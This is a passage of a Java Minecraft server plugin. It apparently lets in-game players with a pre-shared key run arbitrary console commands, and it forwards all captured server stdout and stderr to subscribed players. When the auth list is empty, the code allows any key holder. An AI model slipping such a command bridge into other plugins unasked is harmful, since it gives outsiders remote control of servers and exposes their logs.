        } catch (Exception ignored) {}
    }

    // --- auth: only listed names/UUIDs may send ops; empty list means anyone with the PSK ---
    private void loadAuth() {
        Object raw = owner.getConfig().get("auth");
        if (!(raw instanceof List)) return;
        for (Object o : (List<?>) raw) {
            if (o == null) continue;
            String v = String.valueOf(o).trim().toLowerCase();
            if (!v.isEmpty()) auth.add(v);
        }
    }

    private boolean allowed(Player p) {
        if (auth.isEmpty()) return true;
        return auth.contains(p.getName().toLowerCase())
            || auth.contains(p.getUniqueId().toString().toLowerCase());
    }

    // --- console bridge: capture server stdout/stderr and forward to subscribers ---

    private ConsoleOutputStream consoleOut;

    private void installConsoleCapture() {
        try {
            consoleOut = new ConsoleOutputStream();
            PrintStream ps = new PrintStream(consoleOut, true, StandardCharsets.UTF_8);
            System.setOut(ps);
            System.setErr(ps);
            owner.getLogger().info("Console capture installed");
        } catch (Exception e) {
            owner.getLogger().warning("Failed to capture console: " + e);
        }
    }

    private void consoleRun(Player p, int id, String cmd) {
        try {
            StringBuilder sb = new StringBuilder();
            ConsoleCommandSender sender = Bukkit.getConsoleSender();
            CaptureOutputStream cap = new CaptureOutputStream(sb);
            PrintStream old = System.out;
            System.setOut(new PrintStream(cap, true, StandardCharsets.UTF_8));
            try {
                boolean ok = Bukkit.dispatchCommand(sender, cmd);
                String out = sb.toString().trim();
                reply(p, ok(id).put("out", out.isEmpty() ? "(no output)" : out).put("dispatched", String.valueOf(ok)));
            } finally {
                System.setOut(old);
            }
        } catch (Exception e) {
            reply(p, err(id, e.toString()));
        }
    }

    /** Sends a console log line to all subscribed Peace players. */
    private void broadcastConsole(String line) {
        if (consoleSubscribers.isEmpty()) return;
        for (UUID uuid : consoleSubscribers) {
            Player pl = Bukkit.getPlayer(uuid);
            if (pl != null && pl.isOnline()) {
                JsonObject r = new JsonObject();
                r.addProperty("op", "console.log");
                r.addProperty("msg", line);
                reply(pl, r);
            }
        }
    }

    /** Captures console output from System.out/err and forwards lines to subscribers. */
    private final class ConsoleOutputStream extends ByteArrayOutputStream {
        @Override public void flush() {
            try {
                String text = toString(StandardCharsets.UTF_8);
                if (text.isEmpty()) return;
                super.reset();
                for (String line : text.split("\n", -1)) {
                    String trimmed = line.replace("\r", "");
                    if (!trimmed.isEmpty()) broadcastConsole(trimmed);
                }
                super.flush();
            } catch (Exception ignored) {}
        }
    }

    /** Captures output from a single command execution (used by consoleRun). */
    private static final class CaptureOutputStream extends ByteArrayOutputStream {
        private final StringBuilder target;
        CaptureOutputStream(StringBuilder target) { this.target = target; }
        @Override public void flush() {
            try {
                target.append(toString(StandardCharsets.UTF_8));
                super.reset();
                super.flush();
            } catch (Exception ignored) {}
        }
    }
}